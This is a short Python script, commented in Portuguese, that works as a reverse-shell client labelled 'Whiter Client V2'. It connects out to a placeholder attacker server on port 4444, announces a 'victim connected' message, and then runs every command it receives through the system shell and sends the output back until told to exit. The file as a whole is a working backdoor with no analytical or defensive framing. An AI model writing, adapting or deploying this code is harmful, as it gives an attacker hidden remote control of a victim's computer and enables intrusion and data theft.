import socket
import subprocess

HOST = 'IP_DO_SERVIDOR'  # <-- coloque o IP do servidor aqui
PORT = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(b'Vítima conectada - Whiter Client V2')

while True:
    comando = s.recv(4096).decode()
    if comando.lower() == 'exit':
        break
    try:
        resultado = subprocess.check_output(comando, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        resultado = e.output
    if not resultado:
        resultado = b'Comando executado.'
    s.send(resultado)

s.close()
